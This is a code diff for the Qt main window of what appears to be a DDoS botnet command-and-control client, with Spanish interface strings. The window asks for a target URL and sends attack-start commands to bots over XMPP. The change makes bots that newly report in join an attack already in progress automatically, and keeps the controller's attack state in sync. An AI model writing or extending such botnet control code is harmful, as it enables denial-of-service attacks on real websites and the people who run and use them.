@@ -70,7 +70,7 @@ void MainWindow::startAttack()
     QString target = QInputDialog::getText(this, tr("Iniciar ataque DDoS"), tr("URL Objetivo:"), QLineEdit::Normal, "", &ok);
 
     if(ok && !target.isEmpty()) {
-        setAttackInProgress(true, target);
+        setAttackInProgress(true, Attack(_attack.id() + 1, target));
 
         _xmppClient -> sendCommand(StartAttackCommand(_attack.target(), _attack.id()));
     }
@@ -126,9 +126,19 @@ void MainWindow::responseReceivedOnXmppClient(Message *response)
 {
     qDebug() << "Response received from" << response -> from();
 
-    if(BotStateResponse *botStateResponse = dynamic_cast<BotStateResponse *>(response))
-        _centralWidget -> insertBot(botStateResponse -> from(), new Bot(*botStateResponse -> bot()));
-    else if(dynamic_cast<AttackStartedResponse *>(response)) {
+    if(BotStateResponse *botStateResponse = dynamic_cast<BotStateResponse *>(response)) {
+        Bot *bot = new Bot(*botStateResponse -> bot());
+        _centralWidget -> insertBot(botStateResponse -> from(), bot);
+
+        if(_attackInProgress && bot -> state() != AttackInProgress) {
+            StartAttackCommand command(_attack.target(), _attack.id());
+            command.setTo(botStateResponse -> from());
+            _xmppClient -> sendCommand(command);
+            qDebug() << "Enviado comando para unirse a " << botStateResponse -> from();
+        } else if(!_attackInProgress && bot -> state() == AttackInProgress) {
+            setAttackInProgress(true, bot -> attack());
+        }
+    } else if(dynamic_cast<AttackStartedResponse *>(response)) {
         Bot *bot = _centralWidget -> bot(response -> from());
         bot -> setState(AttackInProgress);
         _centralWidget -> modifyBot(response -> from());
@@ -275,15 +285,15 @@ void MainWindow::setConnected(bool connected)
     _ccLabel -> setText(_connected ? tr("Conectado como %1").arg(_xmppClient -> configuration().jid()) : tr("Desconectado"));
 }
 
-void MainWindow::setAttackInProgress(bool inProgress, const QString& target)
+void MainWindow::setAttackInProgress(bool attackInProgress, const Attack& attack)
 {
-    if(inProgress)
-        _attack.start(target);
-    else
-        _attack.stop();
+    _attackInProgress = attackInProgress;
 
-    _startAttackAction -> setEnabled(_connected && !_attack.inProgress());
-    _stopAttackAction -> setEnabled(_connected && _attack.inProgress());
+    if(_attackInProgress)
+        _attack = attack;
+
+    _startAttackAction -> setEnabled(_connected && !_attackInProgress);
+    _stopAttackAction -> setEnabled(_connected && _attackInProgress);
 }
 
 bool MainWindow::verifyExit()
